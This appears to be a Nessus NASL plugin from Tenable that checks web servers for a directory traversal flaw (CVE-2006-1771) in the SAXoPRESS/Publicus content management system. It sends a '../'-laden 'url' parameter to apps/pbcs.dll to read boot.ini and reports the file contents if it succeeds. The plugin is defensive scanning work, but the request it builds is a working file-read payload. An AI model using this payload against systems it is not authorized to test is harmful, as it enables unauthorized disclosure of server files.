#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(21230);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-1771");
  script_bugtraq_id(17474);
  script_xref(name:"OSVDB", value:"24549");

  script_name(english:"SAXoPRESS pbcs.dll url Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a file using SAXoPRESS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is prone to
directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SAXoPRESS or Publicus, web content
management systems commonly used by newspapers. 

The installation of SAXoPRESS / Publicus on the remote host fails to
validate user input to the 'url' parameter of the 'apps/pbcs.dll'
script.  An attacker can exploit this issue to access files on the
remote host via directory traversal, subject to the privileges of the
web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/430707/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "web_traversal.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if ( get_kb_item(strcat("www/", port, "/generic_traversal"))) exit(0);


file = "../../../../../../../../../../../../boot.ini";


# Loop through various directories.
foreach dir (cgi_dirs())
{
  url = string(
    dir, "/apps/pbcs.dll/misc?",
    "url=", file
  );

  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if looks like boot.ini.
  if ("[boot loader]">< res) 
  {
    if (report_verbosity)
    {
      file = str_replace(find:"../", replace:"", string:file);
      file = "/" + file;

      report = string(
        "\n",
        "Nessus was able to retrieve the contents of '", file, "' on the\n",
        "remote host by sending the following request :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "Here are the contents :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:res), "\n"
        );
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
